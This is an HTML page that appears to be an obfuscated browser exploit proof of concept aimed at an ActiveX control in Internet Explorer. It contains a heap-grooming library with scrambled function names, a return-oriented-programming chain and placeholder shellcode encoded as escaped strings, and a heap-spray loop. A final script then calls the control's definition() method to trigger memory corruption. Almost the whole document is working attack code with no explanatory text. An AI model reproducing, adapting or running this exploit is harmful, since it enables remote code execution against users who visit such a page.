<html>
<body>
<script>
location.href = 'ms-help:'
</script>

<script language='javascript'>
//
function jeUPBKoLtQQjmlZKYnmFetwHiCS() {
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);
    this.lpRzkGSmozzkbr = "AAAA";

    while (4 + this.lpRzkGSmozzkbr.length*2 + 2 < this.maxAlloc) {
        this.lpRzkGSmozzkbr += this.lpRzkGSmozzkbr;
    }
    this.mem = new Array();
    this.jJWpyFBPvaxLRufJC();
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.bboJpOEjqNjkfp = function(msg) {
    void(Math.atan2(0xbabe, msg));
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.NyzkPSTllPneQdgPMMH = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.jkvbKJnSsIOxbUTxZVirUWWFNPFEd = function(msg) {
    void(Math.acos(0xbabe));
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.YPZLpoAUlEEjHXf = function(len) {
    if (len > this.lpRzkGSmozzkbr.length)
        throw "Requested YPZLpoAUlEEjHXf string length " + len + ", only " + this.lpRzkGSmozzkbr.length + " available";

    return this.lpRzkGSmozzkbr.substr(0, len);
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.zxgjPMJdeJNjwcULAqnYoyiqSRYVe = function(num, zxgjPMJdeJNjwcULAqnYoyiqSRYVe) {
    if (zxgjPMJdeJNjwcULAqnYoyiqSRYVe == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (zxgjPMJdeJNjwcULAqnYoyiqSRYVe-1)) / zxgjPMJdeJNjwcULAqnYoyiqSRYVe) * zxgjPMJdeJNjwcULAqnYoyiqSRYVe;
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.IjeAqlsGa = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var IjeAqlsGa = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        IjeAqlsGa = digits.substr(num & 0xF, 1) + IjeAqlsGa;
    }

    var width = (width ? width : 0);

    while (IjeAqlsGa.length < width)
        IjeAqlsGa = "0" + IjeAqlsGa;

    return IjeAqlsGa;
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.TZ = function(TZ) {
    return unescape("%u" + this.IjeAqlsGa(TZ & 0xFFFF, 4) + "%u" + this.IjeAqlsGa((TZ >> 16) & 0xFFFF, 4));
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.ZvMahlBJqkks = function(arg, tag) {

    var size;
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;
    else
        size = arg;
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        this.mem[tag].push(this.YPZLpoAUlEEjHXf((arg-6)/2));
    }
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.ZsNRDVwufZhswKXAODbAriRnARXrGhW = function(tag) {

    delete this.mem[tag];
    CollectGarbage();
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.jJWpyFBPvaxLRufJC = function() {

    this.bboJpOEjqNjkfp("Flushing the OLEAUT32 cache");

    this.ZsNRDVwufZhswKXAODbAriRnARXrGhW("oleaut32");

    for (var i = 0; i < 6; i++) {
        this.ZvMahlBJqkks(32, "oleaut32");
        this.ZvMahlBJqkks(64, "oleaut32");
        this.ZvMahlBJqkks(256, "oleaut32");
        this.ZvMahlBJqkks(32768, "oleaut32");
    }
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.ffIbgjheQtBoJLTHuqiuKQ = function(arg, tag) {

    var size;
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;
    else
        size = arg;
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";
    this.ZvMahlBJqkks(arg, tag);
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.QkiQphZPXbPQLidWpnkfDrCUNRT = function(tag) {
    this.ZsNRDVwufZhswKXAODbAriRnARXrGhW(tag);
    this.jJWpyFBPvaxLRufJC();
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.SywEAcsHCOgedGtQkmiVI = function() {

    this.bboJpOEjqNjkfp("Running the garbage collector");
    CollectGarbage();

    this.jJWpyFBPvaxLRufJC();
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.dVFKTWnAN = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.ffIbgjheQtBoJLTHuqiuKQ(arg);
        this.ffIbgjheQtBoJLTHuqiuKQ(arg, "dVFKTWnAN");
    }
    this.ffIbgjheQtBoJLTHuqiuKQ(arg);

    this.QkiQphZPXbPQLidWpnkfDrCUNRT("dVFKTWnAN");
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.hyR = function(arg, count) {

    var size;
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;
    else
        size = arg;
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum hyR block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.ffIbgjheQtBoJLTHuqiuKQ(arg, "hyR");

    this.QkiQphZPXbPQLidWpnkfDrCUNRT("hyR");
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.xqtYBAeGqoAWybOxaKnqjkVCGQJlXyec = function(arg)
{
    var size;
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;
    else
        size = arg;
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum hyR block size is 1008 bytes");

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}

jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE.prototype.esd = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    var esd = unescape("%u9090%u7ceb")

    for (var i = 0; i < 124/4; i++)
        esd += this.TZ(jmpecx);

    esd += unescape("%u0028%u0028") +
              shellcode + heap.YPZLpoAUlEEjHXf((size-138)/2 - shellcode.length);

    return esd;
}

var heap_obj = new jeUPBKoLtQQjmlZKYnmFetwHiCS.wCPWoQmiRtNQE(0x10000);

var rop = unescape("%uD60C%u51BE%u115C%u51BD%u2D2E%u51BD%u9987%u51C3%uF6BE%u51BD%u2063%u51BE%uC8B6%u51BE%uFFFF%uFFFF%uDF88%u51C1%uF3DF%u51BE%u33D7%u51C4%u0B75%uBF7B%u1602%u51C4%u47F9%u51C5%u50FD%u51C4%uFFC0%uFFFF%uDF88%u51C1%u90DB%u51C3%u25DC%u51BE%uF011%u51C3%u5112%u51C4%u9090%u9090%uA4EC%u51C0");
var code = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
var offset_length = 1534;

for (var i=0; i < 0x800; i++) {
	var randomnumber1=Math.floor(Math.random()*90)+10;
	var randomnumber2=Math.floor(Math.random()*90)+10;
	var randomnumber3=Math.floor(Math.random()*90)+10;
	var randomnumber4=Math.floor(Math.random()*90)+10;

	var YPZLpoAUlEEjHXfstr = "%u" + randomnumber1.toString() + randomnumber2.toString()
	YPZLpoAUlEEjHXfstr += "%u" + randomnumber3.toString() + randomnumber4.toString()

	var YPZLpoAUlEEjHXf = unescape(YPZLpoAUlEEjHXfstr);

	while (YPZLpoAUlEEjHXf.length < 0x1000) YPZLpoAUlEEjHXf+= YPZLpoAUlEEjHXf;

	junk_offset = YPZLpoAUlEEjHXf.substring(0, offset_length);
	var single_sprayblock = junk_offset + rop + code + YPZLpoAUlEEjHXf.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
	while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;

	sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);

	heap_obj.ffIbgjheQtBoJLTHuqiuKQ(sprayblock);

}

document.write("Spray done");
alert("Spray done");

</script>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="PoC"></object>
<script> 

alert('Make it debugged');
var obj = document.getElementById('PoC').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x9999) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(0);

</script>

</body>
</html>
